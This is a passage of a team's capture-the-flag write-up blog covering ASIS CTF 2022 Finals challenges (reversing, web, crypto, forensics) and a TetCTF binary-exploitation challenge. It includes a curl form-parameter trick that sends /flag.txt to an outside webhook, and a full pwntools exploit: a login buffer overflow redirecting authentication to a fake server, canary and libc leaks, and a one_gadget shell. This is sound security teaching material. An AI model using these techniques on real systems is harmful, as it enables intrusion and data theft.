0x61; } else { // Check 4 v35 = strchr(\u0026quot;[\\\\]^{|}~`\\t\u0026quot;, v10); if ( !v35 ) LABEL_9: sub_F30(\u0026quot;Invalid input! Sorry!!\u0026quot;, v11); v36 = v9 + 1; v37 = v9 + 2; v9 += 3; *(_BYTE *)(v5 + v6) = '+'; v6 = v9; *(_BYTE *)(v5 + v36) = '+'; v3 = v9; *(_BYTE *)(v5 + v37) = v35 - (unsigned __int64)\u0026quot;[\\\\]^{|}~`\\t\u0026quot; + 0x61; } } ++i; } while ( i \u0026lt; len ); // ... } As annotated, there are multiple checks. The binary first checks (*b_loc_table + 2LL * cur_char) \u0026amp; 8, where b_loc_table is the returned pointer from __ctype_b_loc(). Looking into C header files, we see that the function __ctype_b_loc is defined inside ctype.h, where it has the following comment:\n/* These point into arrays of 384, so they can be indexed by any `unsigned char\u0026#39; value [0,255]; by EOF (-1); or by any `signed char\u0026#39; value [-128,-1). ISO C requires that the ctype functions work for `unsigned char\u0026#39; values and for EOF; we also support negative `signed char\u0026#39; values for broken old programs. The case conversion arrays are of `int\u0026#39;s rather than `unsigned char\u0026#39;s because tolower (EOF) must be EOF, which doesn\u0026#39;t fit into an `unsigned char\u0026#39;. But today more important is that the arrays are also used for multi-byte character sets. */ extern const unsigned short int **__ctype_b_loc (void) __THROW __attribute__ ((__const__)); #define __isctype(c, type) ((*__ctype_b_loc ())[(int) (c)] \u0026amp; (unsigned short int) type) #define isalnum(c) __isctype((c), _ISalnum)  // LITTLE ENDIAN #define _ISbit(bit) ((bit) \u0026lt; 8 ? ((1 \u0026lt;\u0026lt; (bit)) \u0026lt;\u0026lt; 8) : ((1 \u0026lt;\u0026lt; (bit)) \u0026gt;\u0026gt; 8))  enum { _ISupper = _ISbit (0), /* UPPERCASE. */ _ISlower = _ISbit (1), /* lowercase. */ _ISalpha = _ISbit (2), /* Alphabetic. */ _ISdigit = _ISbit (3), /* Numeric. */ _ISxdigit = _ISbit (4), /* Hexadecimal numeric. */ _ISspace = _ISbit (5), /* Whitespace. */ _ISprint = _ISbit (6), /* Printing. */ _ISgraph = _ISbit (7), /* Graphical. */ _ISblank = _ISbit (8), /* Blank (usually SPC and TAB). */ _IScntrl = _ISbit (9), /* Control character. */ _ISpunct = _ISbit (10), /* Punctuation. */ _ISalnum = _ISbit (11) /* Alphanumeric. */ }; In short, its just a \u0026ldquo;character characteristic\u0026rdquo; lookup table, a C way to check isalpha / etc.\nThe above code is equivalent to something like this in pseudocode:\nstorage = \u0026quot;\u0026quot; for all char c in input: if c is alphabetic: storage += c else if c is space: if previous two in storage is ~=`+[a-zA-Z0-9]`: update the previous two to become upper case else: storage += \u0026quot;/\u0026quot; else: charset = \u0026quot;@$_!\\\u0026quot;#%\u0026amp;'()*+,-./:;\u0026lt;=\u0026gt;?\\n\u0026quot; if c in charset: index = charset.find(c) storage += f\u0026quot;+{index}\u0026quot; else: charset = \u0026quot;[\\\\]^{|}~`\\t\u0026quot; if not in charset: return error and exit storage += f\u0026quot;++{index}\u0026quot; if len(storage) mod 3 != 0: storage += \u0026quot;/\u0026quot; * (3 - len(storage) mod 3) storage = base64_decode(storage) At first, I was so puzzled as I misread the first condition thinking it only checks for numeric characters (turns out it is checking for alphanumeric characters instead, so it make perfect sense), and this makes no sense if the input is a flag.\nAnd my teammate grhkm reminds me I should try base64 conversion first, and I see this:\nCompressin g/short/messages/is/essential+Nso/ASIS/has/developed/new/one+xThe/flag/for/t his/task/is+RASIS++ec0mprEs51nG+csHOr7+ct3xT+cmE5s49es+cASIS+d++g/// So clearly this is the flag, and we can just reverse the ++e etc syntax with the algorithm we reverse above. And this yields us the flag easily.\nRaaS-v1 (Web, 68 solves) Solved by fsharp\nWe\u0026rsquo;re given a URL and an archive file containing the source code for the webpage. The goal is to read the contents of /flag.txt by exploiting a vulnerability.\nThe webpage allows us to request any webpage with a request method of our choice and with the ability to send any form data. The source code is:\n\u0026lt;?php if($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] == \u0026#39;127.0.0.1\u0026#39;){ die(\u0026#39;curl :thonk:\u0026#39;); } $url = \u0026#39;http://localhost\u0026#39;; $method = \u0026#39;GET\u0026#39;; $formParams = []; if(isset($_GET[\u0026#39;url\u0026#39;])){ $url = $_GET[\u0026#39;url\u0026#39;]; } if(isset($_GET[\u0026#39;method\u0026#39;])){ $method = $_GET[\u0026#39;method\u0026#39;]; } if(isset($_GET[\u0026#39;formParams\u0026#39;])){ $formParams = $_GET[\u0026#39;formParams\u0026#39;]; } $cmd = \u0026#39;curl \u0026#39;; $cmd .= \u0026#39;--proto -file \u0026#39;; $cmd .= escapeshellarg($url).\u0026#39; \u0026#39;; $cmd .= \u0026#39;-X \u0026#39;; $cmd .= escapeshellarg($method).\u0026#39; \u0026#39;; foreach($formParams as $key =\u0026gt; $value){ if(preg_match(\u0026#34;/^\\w+$/\u0026#34;,$key)){ $cmd .= \u0026#39;-F \u0026#39;; $cmd .= escapeshellarg($key.\u0026#39;= \u0026#39;.$value); } } header(\u0026#39;Content-Type: text/plain\u0026#39;); system($cmd); Our parameters are passed to the escapeshellarg() function, which adds quotes around them.\nAs hinted by the challenge description, the vulnerability could be found if one reads the documentation of the curl command carefully. Referring to the -F section of its manpage, it can be seen that custom headers could be added to the request by reading from a file as follows:\ncurl -F \u0026quot;submit=OK;headers=@headerfile\u0026quot; example.com\nIt is important to note that $key and $value are not filtered at all (e.g. check if characters like @, ;, = or / are included), which means it is possible for us to use the above command format to read from any file.\nBy opening a webhook and sending data to it by navigating to http://raas-v1.asisctf.com:9000/?url=https://webhook.site/blah\u0026amp;formParams[a]=b;headers=@/flag.txt, we can forge the following command:\ncurl --proto -file 'https://webhook.site/blah' -X 'GET' -F 'a= b;headers=@/flag.txt'\n\u0026hellip;and get the flag!\nBedouin (Crypto, 79 solves) Solved by LifeIsHard\nThe challenge encrypts the message through RSA, but with a unique(ly weak) way of generating the parameters, defined as follows:\nfrom secret import nbit, l, flag def genbed(nbit, l): while True: zo = bin(getPrime(nbit))[2:] OZ = zo * l + '1' if isPrime(int(OZ)): return int(OZ) p, q = [genbed(nbit, l) for _ in '01'] n = p * q d = 1 ^ l ** nbit \u0026lt;\u0026lt; 3 ** 3 phi = (p - 1) * (q - 1) e = inverse(d, phi) m = bytes_to_long(flag) c = pow(m, e, n) if pow(c, d, n) == m: print(f'n = {n}') print(f'c = {c}') In short, the algorithm first generates $p$ and $q$ by\n Defining $l$ and $b$ (nbit in the code), both unknown to us Generates a (essentially) random $b$-digit binary string $zo$ Define $p = \\underbrace{zo \\mathbin\\Vert zo \\mathbin\\Vert \\cdots \\mathbin\\Vert zo}_{l , \\mathrm{of} , zo} \\mathbin\\Vert 1$ and interpret it as a base-10 integer If $p$ is not a prime, repeat the generation process. $q$ is generated in the same manner.  Now, the algorithm generates the remaining RSA parameters by\n $N = pq$ $d = \\left(27 \\cdot l^{b}\\right) \\mathbin{|} 1$ $e = d^{-1} \\ \\mathrm{mod} \\ (p - 1)(q - 1)$ $c = m^e \\ \\mathrm{mod} \\ N$  Firstly, from the output given we see that $N$ is a $617$-digit integer. On the other hand, the generation process shows that $p$ and $q$ have $(lb + 1)$ digits, meaning that $N = pq$ has either $2(lb + 1) - 1$ or $2(lb + 1)$ digits. From this, we deduce that $lb = 308$, which means $b$ is one of the divisors of $308 = 2^2 \\cdot 7 \\cdot 11$. Trying each divisor in order and computing the corresponding $d$, we get the correct answer $(l, b) = (11, 28)$.\nMonward (Crypto, 30 solves) Solved by Mystiz\nGroebner basis is the perfect tool to solve annoying system of equations. Using the relation given by monon(C, P) == monon(C, Q) == monon(C, R) == monon(C, enc), we can construct an ideal from which we can recover $a$, $d$ and $p$. See the code for more details:\nV.\u0026lt;a, d, p\u0026gt; = ZZ['a, d, p'] terms = [] for (x, y) in [P, Q, R, enc]: terms.append(a * x^2 + y^2 - d * x^2 * y^2 - 1) I = Ideal(V, terms) I.groebner_basis() # [a + 110062003148225401725628246404818446720450976623225313995311, # d + 154490734938099229849569067657352117192562308729750369601751, # 209488070485061880311886074351169939903472896311680134404680] Eventually we found\np = 5237201762126547007797151858779248497586822407792003360117 d = 2625317925697180384345488106025337735042363504009731201759 a = 5156435618558632445909094488325020226459116348198759927263 We can also retrieve the order of the curve being q = 5237201762126547007797151858841639845712665151660067904384, which can be factorized to\n$$\\begin{aligned} 2^7 \u0026amp; \\times 7 \\times 1283 \\times 537221 \\times 922861 \\times 2073361 \\\\ \u0026amp; \\times 14270791 \\times 91806719 \\times 1025744989 \\times 3297907903. \\end{aligned}$$\nSince I am lazy to map the Edward\u0026rsquo;s curve into a standard elliptic curve for discrete log, I implemented the Pohlig-Hellman algorithm myself. Eventually we got the flag ASIS{MoN7g0m3ry_EdwArd5_cuRv3}.\nVindica (Crypto, 32 solves) Solved by LifeIsHard\nThe challenge first generates parameters $p$, $q$, $e$, $n = pq$ and $N = (p^2 - 1)(q^2 - 1)$. It then encrypts the flag in a RSA-like protocol, defined as follows:\ndef two_layencrypt(msg, pkey): e, n, _ = pkey Zn = Zmod(n) m = bytes_to_long(msg) c = pow(m, e, n) _c = str(c) l = len(_c) _C = matrix(Zn, [[_c[:l//4], _c[l//4:l//2]], [_c[l//2:3*l//4], _c[3*l//4:l]]]) assert gcd(det(_C), n) == 1 C = _C ** e return C In addition to the encrypted matrix, we are also given $e, n, N$.\nIn short, the algorithm\n Encrypts the flag with normal RSA by raising it to the $e^{\\mathrm{th}}$ power modulo $n$. Splits the base-10 digits of $c$ into four pieces $c_1, c_2, c_3, c_4$  For example, $c = 12345678 \\to (c_1, c_2, c_3, c_4) = (12, 34, 56, 78)$.   Encrypts the matrix $\\bigl( \\begin{smallmatrix} c_1 \u0026amp; c_2 \\ c_3 \u0026amp; c_4 \\end{smallmatrix} \\bigr)$ with RSA again by raising it to the $e^{\\mathrm{th}}$ power modulo $n$.  It is clear that our goal is to recover the primes $p$ and $q$. We note that since we are given both $n$ and $N$, both of which are defined by $p$ and $q$, we have the following system of equations:\n$$ \\begin{cases} n = pq \\\\ N = (p^2 - 1)(q^2 - 1) \\end{cases} $$\nSolution 1 (LifeIsHard) One method to solve the equations is by rewriting $N = p^2q^2 - (p^2 + q^2) + 1 = n^2 + 2n + 1 - (p + q)^2$. Then, we can recover $p + q$. Finally, note that $p$ and $q$ are roots to the quadratic polynomial $(x - p)(x - q) = x^2 - (p + q)x + n$, we can factor $p$ and $q$.\nSolve script (excerpt):\nfrom z3 import * p = Int('p') q = Int('q') print(solve((p**2 - 1)*(q**2 - 1) == N, p * q == n))  Solution 2 (grhkm) Another method to solve this is using Groebner basis. We construct the Ideal $\\left\u0026lt;n - pq, N - (p^2 - 1)(q^2 - 1)\\right\u0026gt; \\subset \\mathbb{Z}[p, q]$, and hope one of the reduced terms is univariate. Note that the default ordering in Sage is degrevlex, standing for \u0026ldquo;Degree reverse lexicographic\u0026rdquo;. However, the degree of the reduced basis doesn\u0026rsquo;t matter for us, just that it is univariate. Therefore, the lex ordering is more suitable for us.\nSolve script (excerpt):\np, q = ZZ[\u0026#39;p, q\u0026#39;].change_ring(order=\u0026#39;lex\u0026#39;).gens() I = Ideal([n - p * q, N - (p^2 - 1) * (q^2 - 1)]) for basis in I.groebner_basis(): try: print(basis.univariate_polynomial().roots()) except TypeError as e: pass  Finally, we can recover $c$ by $c = C^{(e^{-1} \\ \\mathrm{mod} \\ N)}$, and decrypt RSA as usual for the flag.\nWhy is $N$ even provided? Well, it is supposed to serve as the public key modulus for the matrix group $GL(2, \\mathbb{Z} / n\\mathbb{Z})$, also known as the group of all invertible $2 \\times 2$ matrices. By considering the size of the group under mod $p$ and mod $q$ and applying the Chinese Remainder Theorem, we get the modulus! This is also how the decryption process works.  Rhyton (Crypto, 17 solves) Solved by Mystiz, LifeIsHard, grhkm\nIn the problem, we are given L = 110 sets of data, generated through the following code:\n# nbit, delta, L = 512, 0.14, 110 def gen_rhyton(nbit, delta, L): p, q = [getPrime(nbit) for _ in \u0026#39;01\u0026#39;] n = p * q D = int(n ** (1 - delta)) phi = (p - 1) * (q - 1) V = [getRandomRange(1, n - 1) for _ in range(L)] U = [phi * v // n for v in V] W, i = [], 0 while True: w = getRandomRange(phi * V[i] - U[i] * n - D, phi * V[i] - U[i] * n + D) if abs(phi * V[i] - U[i] * n - w) \u0026lt; D and w \u0026lt; n: W.append(w) i += 1 if i == L: break return (p, q, U, V, W) In short, the function\n Generates 512-bit primes $p$ and $q$ and computes $\\varphi = (p - 1)(q - 1)$ and $N = pq$ Defines $D := \\lfloor N^{0.86} \\rfloor$ Generates 110 random integers $v_i \\in [1, N - 1)$ Defines $u_i := \\lfloor \\frac{\\varphi v_i}{N} \\rfloor$ Defines $X_i := \\varphi v_i - N u_i$ Generate 110 random integers $w_i \\in [X_i - D, X_i + D)$. Returns the data $(p, q, (v_i, u_i, w_i))$.  Firstly, we can rewrite the defining definition of $w_i$ as\n$$|w_i - X_i| \u0026lt; D \\implies |w_i + Nu_i - \\varphi v_i| \u0026lt; D \\approx N^{0.86}$$\nThis means that the quantity $w_i + Nu_i - \\varphi v_i$ is \u0026ldquo;small\u0026rdquo;. Furthermore, since the quantities $N, w_i, v_i$ are known, this is a standard application of lattice-reduction algorithms. As a note, we may write $\\varphi = N - \\varphi'$, where $\\varphi' \\approx N^{0.5}$, which may perform better in the lattice.\nLattice construction ($110 \\times 112$):\n$$\\begin{pmatrix} w_0 \u0026amp; w_1 \u0026amp; \\cdots \u0026amp; w_{109} \u0026amp; 1 \u0026amp; n \\\\ -v_0 \u0026amp; -v_1 \u0026amp; \\cdots \u0026amp; -v_{109} \u0026amp; 0 \u0026amp; -1 \\\\ n \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 0 \u0026amp; 0 \u0026amp; 0 \\\\ 0 \u0026amp; n \u0026amp; \\cdots \u0026amp; 0 \u0026amp; 0 \u0026amp; 0 \\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \u0026amp; \\vdots \u0026amp; \\vdots \\\\ 0 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; n \u0026amp; 0 \u0026amp; 0 \\end{pmatrix}$$\nSolve script:\nfor i in range(110): A[0, i] = W[i] A[1, i] = -V[i] A[2+i, i] = n if True: A[0, 110] = 1 A[0, 111] = n A[1, 111] = -1 weights = [1/int(n^0.86) for _ in range(110)] + [1, 1/int(n^0.5)] Q = diagonal_matrix(weights) A *= Q A = A.LLL() # \u0026lt;- A /= Q Fun fact: The solve script works with $4$ data points instead of $110$.  Basic (Forensics + Misc, 34 solves) Solved by fsharp\nA file called basic.raw is given to us.\nOpening it in a hex editor, it appears to be a corrupted Stata .dta file. Referring to a website that describes the file format and the sample file it references, we can notice 3 errors with the file and fix them manually as follows:\n The beginning of the file should be replaced with \u0026lt;stata_dta\u0026gt;\u0026lt;header\u0026gt;\u0026lt;release\u0026gt;118\u0026lt;/release\u0026gt;\u0026lt;byteo. The end of the file should be replaced with rls\u0026gt;\u0026lt;/strls\u0026gt;\u0026lt;value_labels\u0026gt;\u0026lt;/value_labels\u0026gt;\u0026lt;/stata_dta\u0026gt;. \u0026lsquo;Blank\u0026rsquo; regions of the file should contain 0x00s. So, replace the 0xA3s in the varnames section with 0x00s.  Afterwards, we can read the file using the Pandas library. We get a few hundred rows of data, where each row contains 3 columns:\n position: A number. isflagchar: Is this a character for the flag? md5charsalt: An MD5 hash.  The description of the md5charsalt variable given by the file is specifically md5(char + 'SALT'). I took it literally and tried to find the characters with the salt as SALT, but none were found.\nInitially, I was confused with what the challenge was asking for. However, Mystiz looked up a few of those hashes on reverse MD5 websites and found that the salt was actually s4Lt. Thanks to his help and with a little more guessing, I was able to complete my script and solve this challenge:\nfrom hashlib import md5 from pandas import read_stata df = read_stata(\u0026#34;repaired.dta\u0026#34;) hashes = set() flag = [] for (position, isflagchar, md5charsalt) in zip(df[\u0026#34;position\u0026#34;], df[\u0026#34;isflagchar\u0026#34;], df[\u0026#34;md5charsalt\u0026#34;]): if isflagchar == \u0026#39;Y\u0026#39;: hashes.add(md5charsalt) flag.append([position, md5charsalt]) hashes = list(hashes) flag = [md5charsalt for [position, md5charsalt] in sorted(flag)] for hash in hashes: for c in range(32, 127): s = \u0026#34;s4Lt\u0026#34; + chr(c) if md5(s.encode()).hexdigest() == hash: for i in range(len(flag)): if flag[i] == hash: flag[i] = chr(c) break print(\u0026#39;\u0026#39;.join(flag)) ","permalink":"https://b6a.black/posts/2023-01-10-asisctf/","summary":"Our collection of writeups for ASIS CTF 2022.","title":"ASIS CTF 2022 Finals Writeup"},{"content":"Challenge description  I did not solve it in time (30 minutes late T.T). However, I spent quite of lot of time on this challenge, so I might as well do a write up. Special thanks to Mystiz, fsharp, cire meat pop for helping me on this challenge.\nReverse engineering The provided binary will connect to a remote authentication server which provides the user/password\nThe original authentication server is hosting on 139.162.36.205 6666 and gives the folloing response when connected.\nroot:$6$tet$.84DBkpbpZEcXF.WKDJJDSStwXYJir3.WSKOma1e5N20d4SDpbMPLryTcZaB7buisGAsT2GW1bdad74Hh3Ply0:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false phieulang:$6$tet$c6Gn4JRQYto4qK3o0nx.iF04g9XaR0bceVJmyjFqVplnSCkZKPJSz30tfvKbu/mNHPHC/kJdtSELbfHzRchTN.:1000:1000:,,,:/home/phieulang:/usr/bin/zsh mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin Hash cracking? Not this way.\nAfter login, we could have access to read file function. There are 5 files and the content of the first 4 files are constant, and seems to be dumped from /dev/urandom. The fifth file is urandom.\nVulnerbility Analysis Bypass the login There is a buffer overflow in the login function. See the pseudo-code from ghidra.\nvoid login(void) { ssize_t readResult; long in_FS_OFFSET; char continueLogin; int readSize; int sockFd; char *serverIp; char *usernameBuffer; char *passwordBuffer; int *loginResult; char *authToken; char password [128]; char username [128]; int authData [2]; char acStack80 [8]; undefined authPacket [56]; long canary; canary = *(long *)(in_FS_OFFSET + 0x28); serverIp = \u0026#34;tet.ctf\u0026#34;; usernameBuffer = username; passwordBuffer = password; loginResult = authData; authData[0] = 0; authToken = acStack80; do { memset(authPacket,0,0x10); getServerIp(serverIp,authToken); printf(\u0026#34;Username: \u0026#34;); readResult = read(0,usernameBuffer,0xb0); readSize = (int)readResult; Here is an illustration.\n So we can control variables on stack, one of them is the authentication server IP. Like this.\n To host my own authentication server, I have compiled the following c code and used socat to serve the binary. The server needs to be accessible from the internet at port 6666. The credential is simply just root:P@ssw0rd.\n#include \u0026lt;stdio.h\u0026gt; int main(void) { printf(\u0026#34;root:$y$j9T$Jh.SJVlEpZJ4VjpG7xQqI/$Ddq3Nf1sbgyS91Hy.6jhv88/gz5al3p830zEFjFWrt0:0:0:root:/root:/bin/bash\\n\u0026#34;); return 0; } socat tcp-l:6666,reuseaddr,fork EXEC:\u0026quot;./a.out\u0026quot;,pty,stderr\nAfter that, we could login as root. We now have access to the read file function.\nRead file feature There is a buffer overflow in the read file function. See the pseudo-code from ghidra.\nchar readBuffer [264]; //...snip... while (true) { printf(\u0026#34;How many bytes to read?\u0026#34;); lVar1 = getNumber(); size = (int)lVar1; if (size == -1) break; memset(readBuffer,0,0x100); sVar2 = read(ret_val3,readBuffer,(long)size); if (sVar2 == 0) { puts(\u0026#34;No more data!\u0026#34;); break; } puts(readBuffer); } Read premise We can corrupt the stack by specifying a read size larger than the buffer size.\nSince the readBuffer would be passed to the function puts, we can specify a specific size such that it would leak values on stack as the puts function would print until null byte was reached. We could leak the canary and libc base with this function.\nWrite premise The function call read(ret_val3,readBuffer,(long)size); would read from the selected file and write to the readBuffer with the specified size. Let say we know the data inside the file on the challenge server, we can achieve write to stack by writing from the furthest address . Basically find how far is the target byte in the file based on the current reading index. Do some math to skip to the correct reading index. Read the wanted offset to write the byte to stack. Simple? See the following implementation and see how to write a target byte into a specific offset from readBuffer.\ndef writeByte(p, targetByte, offset): global read_index log.info(f\u0026#34;writeByte() targetByte : {hex(targetByte)}offset : {offset}read_index : {read_index}\u0026#34;) with open(\u0026#39;./data/file.bin\u0026#39;,\u0026#39;rb\u0026#39;) as fp: fp.seek(read_index) data = fp.read() distance = data[offset:].index(targetByte) + 1 + offset idx = distance - offset skip_count = idx//BUF_SIZE final_read_size = idx%BUF_SIZE for i in range(skip_count): p.sendlineafter(b\u0026#34;read?\u0026#34;,f\u0026#34;{BUF_SIZE}\u0026#34;.encode()) p.sendlineafter(b\u0026#34;read?\u0026#34;,f\u0026#34;{final_read_size}\u0026#34;.encode()) p.sendlineafter(b\u0026#34;read?\u0026#34;,f\u0026#34;{offset}\u0026#34;.encode()) read_index += distance Exploitation Since we have both read and write premise, we could achieve code execution by overwriting the return address. Use one_gadget to find a decent gadget and try to satisfy the conditions. Dont forget to fix the canary when you leave the read file function.\nHere is a nice screenshot.\n TetCTF{w4rm_uP_ch4lL3ng3__g0Od_g4m3!}\nSolve script This script is used to dump file 1 on the challenge server:\nfrom pwn import * read_index = 0 bytes_to_read = 264 sleep_secs = 2 question = b\u0026#34;How many bytes to read?\u0026#34; file_index = 1 with open(\u0026#34;./data/file.bin\u0026#34;,\u0026#39;rb\u0026#39;) as fp: old_data = fp.read(read_index) with open(\u0026#34;./data/file.bin\u0026#34;,\u0026#39;wb\u0026#39;) as fp: fp.write(old_data) while True: print(f\u0026#39;Reconnect read_index : {read_index}\u0026#39;) p = remote(\u0026#34;139.162.36.205\u0026#34;, 31337) p.sendlineafter(b\u0026#34;Your choice: \u0026#34;, b\u0026#34;1\u0026#34;) p.sendlineafter(b\u0026#34;Username: \u0026#34;, b\u0026#34;root\\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa198.199.78.86\u0026#34;) p.sendlineafter(b\u0026#34;Password: \u0026#34;, b\u0026#34;P@ssw0rd\u0026#34;) p.sendlineafter(b\u0026#34;Your choice: \u0026#34;, b\u0026#34;2\u0026#34;) p.sendlineafter(b\u0026#34;Enter the index of the file to read: \u0026#34;, str(file_index).encode()) try: if read_index == 0: p.sendlineafter(question, str(bytes_to_read).encode()) else: steps = read_index // bytes_to_read off = read_index % bytes_to_read for i in range(steps): p.sendlineafter(question, str(bytes_to_read).encode()) if off != 0: p.sendlineafter(question, str(off).encode()) p.sendlineafter(question, str(bytes_to_read).encode()) a = p.recv(bytes_to_read) print(f\u0026#34;{a}\u0026#34;) if(len(a) \u0026lt; bytes_to_read): read_index += len(a) + 1 a += b\u0026#39;\\x00\u0026#39; else: read_index += len(a) fp.write(a) p.close() if read_index \u0026gt; 20000: break except Exception as e: print(f\u0026#39;Error {e}\u0026#39;) p.close() continue from pwn import * import binascii context.log_level = \u0026#34;info\u0026#34; # 0x50a37 posix_spawn(rsp+0x1c, \u0026#34;/bin/sh\u0026#34;, 0, rbp, rsp+0x60, environ) # constraints: # rsp \u0026amp; 0xf == 0 # rcx == NULL # rbp == NULL || (u16)[rbp] == NULL # 0xebcf1 execve(\u0026#34;/bin/sh\u0026#34;, r10, [rbp-0x70]) # constraints: # address rbp-0x78 is writable # [r10] == NULL || r10 == NULL # [[rbp-0x70]] == NULL || [rbp-0x70] == NULL # 0xebcf5 execve(\u0026#34;/bin/sh\u0026#34;, r10, rdx) # constraints: # address rbp-0x78 is writable # [r10] == NULL || r10 == NULL # [rdx] == NULL || rdx == NULL # 0xebcf8 execve(\u0026#34;/bin/sh\u0026#34;, rsi, rdx) # constraints: # address rbp-0x78 is writable # [rsi] == NULL || rsi == NULL # [rdx] == NULL || rdx == NULL read_index = 0 BUF_SIZE = 264 def readFile(p, idx): p.sendlineafter(b\u0026#34;Your choice:\u0026#34;,b\u0026#34;2\u0026#34;) p.sendlineafter(b\u0026#34;Enter the index of the file to read:\u0026#34;,f\u0026#34;{idx}\u0026#34;.encode()) def readBytes(p, size, readSize): global read_index try: with open(\u0026#39;./data/file.bin\u0026#39;,\u0026#39;rb\u0026#39;) as fp: fp.seek(read_index) data = fp.read() p.sendlineafter(b\u0026#34;read?\u0026#34;,f\u0026#34;{size}\u0026#34;.encode()) log.debug(f\u0026#39;DUMP: {binascii.hexlify(data[:size])}\u0026#39;) tmp = p.recv(readSize) read_index += size while(len(tmp) \u0026lt; readSize): log.debug(f\u0026#34;readBytes read {readSize}got {len(tmp)}\u0026#34;) p.send(f\u0026#39;{size}\u0026#39;.encode()) log.debug(f\u0026#39;DUMP: {binascii.hexlify(data[:size])}\u0026#39;) tmp = p.recv(readSize) read_index += size return tmp except Exception as e: log.debug(f\u0026#34;readByte error {e}\u0026#34;) def writeByte(p, targetByte, offset): global read_index log.info(f\u0026#34;writeByte() targetByte : {hex(targetByte)}offset : {offset}read_index : {read_index}\u0026#34;) with open(\u0026#39;./data/file.bin\u0026#39;,\u0026#39;rb\u0026#39;) as fp: fp.seek(read_index) data = fp.read() distance = data[offset:].index(targetByte) + 1 + offset #Look for target Byte that is at least offset away from start. Off by 1 idx = distance - offset skip_count = idx//BUF_SIZE final_read_size = idx%BUF_SIZE log.debug(f\u0026#34;distance : {distance}idx : {idx}skip_count : {skip_count}final_read_size : {final_read_size}\u0026#34;) for i in range(skip_count): p.sendlineafter(b\u0026#34;read?\u0026#34;,f\u0026#34;{BUF_SIZE}\u0026#34;.encode()) log.debug(f\u0026#39;DUMP: {binascii.hexlify(data[BUF_SIZE*i:BUF_SIZE*i+BUF_SIZE])}\u0026#39;) if not final_read_size == 0: p.sendlineafter(b\u0026#34;read?\u0026#34;,f\u0026#34;{final_read_size}\u0026#34;.encode()) log.debug(f\u0026#39;DUMP: {binascii.hexlify(data[BUF_SIZE*skip_count:BUF_SIZE*skip_count+final_read_size])}\u0026#39;) p.sendlineafter(b\u0026#34;read?\u0026#34;,f\u0026#34;{offset}\u0026#34;.encode()) log.debug(f\u0026#39;DUMP: {binascii.hexlify(data[BUF_SIZE*skip_count+final_read_size:BUF_SIZE*skip_count+final_read_size+offset])}\u0026#39;) read_index += distance function_offset = 0x7feedf585d90 - 0x007feedf55c000 # p = process(\u0026#39;./chall\u0026#39;) # gdb.attach(p) p = remote(\u0026#34;139.162.36.205\u0026#34;,31337) #Login p.sendlineafter(b\u0026#34;Your choice:\u0026#34;,b\u0026#34;1\u0026#34;) p.sendlineafter(b\u0026#34;Username:\u0026#34;,b\u0026#34;root\\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa198.199.78.86\u0026#34;) p.sendlineafter(b\u0026#34;Password:\u0026#34;,b\u0026#34;P@ssw0rd\u0026#34;) readFile(p, 1) # Get canary offset_canary = BUF_SIZE+1 leak = readBytes(p,offset_canary, offset_canary+7) canary = u64(b\u0026#39;\\x00\u0026#39;+ leak[offset_canary:offset_canary+7]) log.info(f\u0026#34;canary : {hex(canary)}\u0026#34;) # Get libc_base offset_functon = BUF_SIZE+32 leak = readBytes(p,offset_functon, offset_functon+6) function_leak = u64(leak[offset_functon:offset_functon+6] + b\u0026#39;\\x00\\x00\u0026#39;) #__libc_start_call_main+128 log.info(f\u0026#34;__libc_start_call_main+128 : {hex(function_leak)}\u0026#34;) libc_base = function_leak - function_offset log.info(f\u0026#34;libc_base base : {hex(libc_base)}\u0026#34;) #Calculate gadget address gadget = 0x50a37 + libc_base # gadget = 0x616161616161 log.info(f\u0026#34;one gadget : {hex(gadget)}\u0026#34;) #Rewrite return address return_offset = BUF_SIZE+16 for idx,byte in zip(range(return_offset+8,return_offset,-1),p64(gadget)[::-1]): writeByte(p,byte,idx) 